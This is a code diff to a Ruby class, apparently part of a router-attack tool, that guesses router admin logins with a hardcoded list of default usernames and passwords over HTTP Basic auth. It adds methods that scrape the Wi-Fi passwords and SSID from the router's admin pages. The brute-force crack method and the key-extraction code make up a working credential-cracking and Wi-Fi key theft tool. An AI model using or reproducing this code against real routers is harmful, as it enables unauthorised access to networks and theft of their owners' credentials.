@@ -10,6 +10,14 @@ class Rpw
 		@user=""
 		@passwd=""
 		@isCrack=false
+		@wifiPassword={}
+		@ssid=""
+	end
+	def ssid
+		@ssid
+	end
+	def wifiPassword
+		@wifiPassword
 	end
 	def routerType
 		@routerType
@@ -48,7 +56,6 @@ class Rpw
 	end
 	def crack(url="")
 		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman","admin"]
-		password = password.reverse()
 		user = ["admin","superman"]
 		threads = []
 		credential = []
@@ -83,7 +90,7 @@ class Rpw
 		req['Authorization']="Basic #{Base64.encode64("#{@user}:#{@passwd}")}"
 		begin 
 			res = Net::HTTP.start(uri.host, uri.port) {|http| http.request(req) }
-		rescue Errno::ECONNRESET,Errno::ECONNREFUSED
+		rescue Errno::ECONNRESET,Errno::ECONNREFUSED,Errno::ETIMEDOUT,EOFError
 			return false
 		end
 		return res
@@ -95,7 +102,7 @@ class Rpw
 		req['Authorization']="Basic #{Base64.encode64("#{user_name}:#{passwd}")}"
 		begin 
 			res = Net::HTTP.start(uri.host, uri.port) {|http| http.request(req) }
-		rescue Errno::ECONNRESET,Errno::ECONNREFUSED
+		rescue Errno::ECONNRESET,Errno::ECONNREFUSED,Errno::ETIMEDOUT,EOFError
 			return false
 		end
 		return {:response => res,:credential  => {:user => user_name , :password =>  passwd}}
@@ -116,10 +123,62 @@ class Rpw
 			else
 				ret << nil
 			end
-			
+			@wifiPassword[type.upcase.to_sym]=ret[-1]
 			
 		end
 		return ret
+	end
+	def getSsid()
+		
+		url=RouterFP.getSsidUrl(@routerType)
+		data=getHttp(url)
+		
+		regex=RouterFP.getRex(@routerType,"ssid")
+		if ssid=data.body.match(regex)
+			@ssid=parseSSID(ssid[1])
+		else
+			@ssid=""
+		end
+	end
+	def getSW(typeArray)
+		url=RouterFP.getKeyUrl(@routerType)
+		getHttp(url)
+		data=getHttp(url)
+		ret=[]
+		for type in typeArray
+			regex=RouterFP.getRex(@routerType,type)
+			if passwd=data.body.match(regex)
+				ret << passwd[1]
+			else
+				ret << nil
+			end
+			@wifiPassword[type.upcase.to_sym]=ret[-1]
+			
+		end
+		regex=RouterFP.getRex(@routerType,"ssid")
+		if ssid=data.body.match(regex)
+
+			@ssid=parseSSID(ssid[1])
+		else
+			@ssid=""
+		end
+
+		return ret
+	end
+	def parseSSID(ssid)
+		
+		if ssid.nil?
+			return ""
+		end
+		if ssid.size<3
+			return ssid
+		end
+		if ssid[0..1]!="&#"
+		    return ssid
+		end
+		ssid[0]=""
+		ssid=ssid.scan(/#../).map! {|i| i.gsub("#","").to_i.chr}.join
+		return ssid
 	end
 	def ip
 		@ip
@@ -131,3 +190,4 @@ class Rpw
 		@active
 	end
 end
+  
